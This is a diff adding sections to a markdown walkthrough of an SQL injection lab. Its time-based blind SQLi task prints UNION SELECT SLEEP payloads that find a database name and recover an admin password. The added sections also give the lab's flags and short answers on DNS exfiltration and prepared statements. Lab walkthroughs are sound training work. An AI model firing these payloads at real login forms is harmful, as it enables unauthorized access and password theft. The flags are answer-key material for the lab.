@@ -118,3 +118,46 @@ As you can see here password character start with `3`<br/>
 ![password found](images/27-password-also-found.png)<br/>
 After many tryed I've found the password like `3845` and I'm logged in successfully and get the flag.<br/>
 #### A: `THM{SQL_INJECTION_1093}` :heavy_check_mark:<br/>
+
+
+## Task 8: Blind SQLi - Time Based
+### Q: What is the final flag after completing level four?
+
+    admin123' UNION SELECT SLEEP(5),1;--
+![sleep time](images/28-sleep-time.png)<br/>
+This payload should have produced a 5-second time delay, you've to try after find the last column number by increasing number of value.<br/>
+
+    admin123' UNION SELECT SLEEP(5),2;--
+![increasing column number](images/29-increasing.png)<br/>
+In this case value `2` is the last column number<br/>
+
+    admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--
+![db finding](images/30-db-finding.png)<br/>
+As you can see here database character start with `s`<br/>
+
+    admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four%';--
+![find full database name](images/31-found-full-db-name.png)<br/>
+I've found database name `sqli_four`. This is same as previous boolean based method.<br/>
+
+    admin123' UNION SELECT SLEEP(5), 2 from users where username='admin' and password like '4%
+![pwd char](images/32-pwd-char.png)<br/>
+As you can see here password character start with `4`<br/>
+
+    admin123' UNION SELECT SLEEP(5), 2 from users where username='admin' and password like '4961%
+![full pwd get](images/33-full-pwd-get.png)<br/>
+After many tryed I've found the password like `4961`<br/>
+
+![get final flag](images/34-get-final-flag.png)<br/>
+#### A: `THM{SQL_INJECTION_MASTER}` :heavy_check_mark:<br/>
+
+
+## Task 9: Out-of-Band SQLi
+### Q: Name a protocol beginning with D that can be used to exfiltrate data from a database.
+#### A: `DNS` :heavy_check_mark:<br/>
+
+
+## Task 10: Remediation
+### Q: Name a method of protecting yourself from an SQL Injection exploit.
+![statements](images/35-statements.png)<br/>
+#### A: `Prepared Statements` :heavy_check_mark:<br/>
+<h3 align='center'>:fire: Congratulations, Happy Hacking :fire: </h3>
